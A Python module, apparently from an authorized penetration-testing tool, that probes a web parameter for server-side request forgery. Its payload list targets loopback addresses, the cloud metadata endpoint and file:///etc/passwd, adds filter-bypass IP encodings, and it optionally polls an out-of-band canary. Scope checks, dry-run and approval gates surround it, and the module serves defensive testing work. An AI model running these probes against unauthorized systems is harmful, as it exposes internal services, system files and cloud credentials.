"""Capped SSRF probe — benign + internal/metadata markers only (authorized)."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

# Tiny non-destructive Linux/Windows markers + optional OOB + bypass pack (capped)
_PAYLOADS = (
    ("http://127.0.0.1/", ("localhost", "127.0.0.1", "nginx", "apache", "iis")),
    ("http://169.254.169.254/latest/meta-data/", ("ami-id", "instance-id", "local-ipv4", "meta-data")),
    ("http://[::1]/", ("localhost", "::1")),
    ("file:///etc/passwd", ("root:x:",)),
    # Bypass-ish (still benign markers only)
    ("http://127.1/", ("localhost", "127.0.0.1")),
    ("http://0.0.0.0/", ("localhost", "0.0.0.0")),
    ("http://2130706433/", ("localhost", "127.0.0.1")),  # decimal IP
    ("http://localtest.me/", ("localhost", "127.0.0.1")),
)


def ssrf_probe(
    target_dir: Path,
    url: str,
    *,
    param: str = "url",
    approve: bool = False,
    force: bool = False,
    timeout: float = 10.0,
    use_oob: bool = True,
) -> RunnerResult:
    require_in_scope(target_dir, url, action="ssrf probe", force=force)
    parsed = urllib.parse.urlparse(url if "://" in url else f"https://{url}")
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    payloads = list(_PAYLOADS)
    canary = None
    if use_oob:
        try:
            from ..oob import enrich_ssrf_payloads, mint_canary, oob_configured

            if oob_configured():
                canary = mint_canary(kind="ssrf")
                payloads = enrich_ssrf_payloads(payloads, canary=canary)
        except Exception:  # noqa: BLE001
            pass
    plan = {
        "url": url,
        "param": param,
        "payloads": len(payloads),
        "approve": approve,
        "oob": bool(canary),
    }
    ui.code_panel(json.dumps(plan, indent=2), title="ssrf_probe", lexer="json")
    cmd = ["ssrf_probe", url, f"param={param}"]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    results: list[dict[str, Any]] = []
    signal = False
    reason = "no SSRF marker"
    for payload, markers in payloads:
        qs2 = dict(qs)
        qs2[param] = [payload]
        probe = urllib.parse.urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                "",
                urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs2.items()}),
                "",
            )
        )
        try:
            req = urllib.request.Request(probe, headers={"User-Agent": "hackbot-ssrf-probe"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = int(getattr(resp, "status", None) or resp.getcode())
                body = resp.read(80_000).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            status = int(exc.code)
            body = exc.read(40_000).decode("utf-8", errors="replace") if exc.fp else ""
        except Exception as exc:  # noqa: BLE001
            results.append({"payload": payload, "error": type(exc).__name__})
            continue
        hit = any(m.lower() in body.lower() for m in markers)
        results.append(
            {
                "payload": payload,
                "status": status,
                "marker": hit,
                "preview": redact_text(body[:160]),
            }
        )
        if hit:
            signal = True
            reason = f"SSRF-like marker for payload={payload}"
            break

    payload_out = {
        "ok": True,
        "signal": signal,
        "reason": reason,
        "results": results,
        "param": param,
        "canary": canary,
    }
    if canary:
        try:
            from ..oob import persist_last_canary, wait_and_poll

            persist_last_canary(target_dir, canary)
            poll = wait_and_poll(canary, rounds=3, delay_sec=1.5)
            payload_out["oob_poll"] = poll
            if poll.get("signal"):
                signal = True
                payload_out["signal"] = True
                payload_out["reason"] = "OOB canary hit"
        except Exception:  # noqa: BLE001
            pass
    return RunnerResult(cmd, True, 0, json.dumps(payload_out), "", "executed")
